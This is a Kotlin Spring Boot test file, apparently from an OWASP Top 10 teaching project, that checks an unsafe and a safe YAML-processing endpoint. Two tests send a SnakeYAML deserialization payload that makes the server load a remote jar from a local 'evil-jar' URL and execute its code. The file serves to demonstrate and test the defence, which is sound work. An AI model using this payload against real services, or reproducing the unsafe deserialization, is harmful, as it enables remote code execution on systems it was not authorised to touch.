package cz.bedla.owasptop10

import org.assertj.core.api.Assertions.assertThat
import org.assertj.core.api.Assertions.assertThatThrownBy
import org.junit.jupiter.api.BeforeEach
import org.junit.jupiter.api.Test
import org.junit.jupiter.params.ParameterizedTest
import org.junit.jupiter.params.provider.CsvSource
import org.springframework.beans.factory.annotation.Autowired
import org.springframework.boot.autoconfigure.EnableAutoConfiguration
import org.springframework.boot.autoconfigure.jdbc.DataSourceAutoConfiguration
import org.springframework.boot.autoconfigure.jdbc.DataSourceTransactionManagerAutoConfiguration
import org.springframework.boot.autoconfigure.jdbc.JdbcTemplateAutoConfiguration
import org.springframework.boot.test.context.SpringBootTest
import org.springframework.boot.test.web.server.LocalServerPort
import org.springframework.boot.web.client.RestTemplateBuilder
import org.springframework.http.HttpStatus
import org.springframework.test.context.ActiveProfiles
import org.springframework.web.client.HttpServerErrorException
import org.springframework.web.client.RestTemplate

@SpringBootTest(
    webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT,
    properties = [
        "server.error.include-stacktrace=always"
    ]
)
@EnableAutoConfiguration(
    exclude = [
        DataSourceAutoConfiguration::class,
        DataSourceTransactionManagerAutoConfiguration::class,
        JdbcTemplateAutoConfiguration::class
    ]
)
@ActiveProfiles("rce")
class RemoteCodeExecutionControllerTest {
    @Autowired
    private lateinit var restTemplateBuilder: RestTemplateBuilder

    private lateinit var restTemplate: RestTemplate

    @LocalServerPort
    private var port = 0

    @BeforeEach
    fun setUp() {
        restTemplate = restTemplateBuilder.build()
        restTemplate.resetHackedStatus(port)
    }

    @ParameterizedTest
    @CsvSource(
        "/process-yaml-unsafe",
        "/process-yaml-safe"
    )
    fun callWithHarmlessData(endpointPath: String) {
        val responseEntity = restTemplate.postForEntity(
            "$baseUrl$endpointPath",
            ProcessYamlRequest("name: Hello world!"),
            Any::class.java,
            mapOf(
                "port" to port
            )
        )

        assertThat(responseEntity.statusCode)
            .isEqualTo(HttpStatus.OK)
        assertThat(responseEntity.body as Map<Any?, Any?>)
            .containsEntry("result", "{name=Hello world!}")
        assertThat(restTemplate.getHackedStatus(port))
            .isFalse()
    }

    @Test
    fun unsafeCallWithEvilData() {
        assertThatThrownBy {
            restTemplate.postForEntity(
                "$baseUrl/process-yaml-unsafe",
                ProcessYamlRequest("!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://localhost:8082/evil-jar\"]]]]"),
                Any::class.java,
                mapOf(
                    "port" to port
                )
            )
        }
            .isInstanceOf(HttpServerErrorException.InternalServerError::class.java)
            .hasMessageContainingAll(
                "Can't construct a java object for tag:yaml.org,2002:javax.script.ScriptEngineManager;",
                "in 'string', line 1, column 1:",
                "!!javax.script.ScriptEngineManag ...",
                "cz.bedla.owasptop10.evil.EvilScriptEngineFactory.getEngineName(EvilScriptEngineFactory.kt:"

            )

        assertThat(restTemplate.getHackedStatus(port))
            .isTrue()
    }

    @Test
    fun safeCallWithEvilData() {
        assertThatThrownBy {
            restTemplate.postForEntity(
                "$baseUrl/process-yaml-safe",
                ProcessYamlRequest("!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://localhost:8082/evil-jar\"]]]]"),
                Any::class.java,
                mapOf(
                    "port" to port
                )
            )
        }
            .isInstanceOf(HttpServerErrorException.InternalServerError::class.java)
            .hasMessageContainingAll(
                "could not determine a constructor for the tag tag:yaml.org,2002:javax.script.ScriptEngineManager",
                "in 'string', line 1, column 1:",
                "!!javax.script.ScriptEngineManag ...",
                "at cz.bedla.owasptop10.RemoteCodeExecutionController.processYamlSafe(A03RemoteCodeExecutionController.kt:"

            )

        assertThat(restTemplate.getHackedStatus(port))
            .isFalse()
    }

    companion object {
        private val baseUrl = "http://localhost:{port}"

        private fun RestTemplate.resetHackedStatus(port: Int) {
            val responseEntity = this.getForEntity(
                "$baseUrl/reset-hacked-status",
                Any::class.java,
                mapOf(
                    "port" to port
                )
            )
            assertThat(responseEntity.statusCode)
                .isEqualTo(HttpStatus.OK)
        }

        private fun RestTemplate.getHackedStatus(port: Int): Boolean {
            val responseEntity = this.getForEntity(
                "$baseUrl/get-hacked-status",
                Map::class.java,
                mapOf(
                    "port" to port
                )
            )

            return responseEntity.body?.get("hacked") as Boolean
        }
    }
}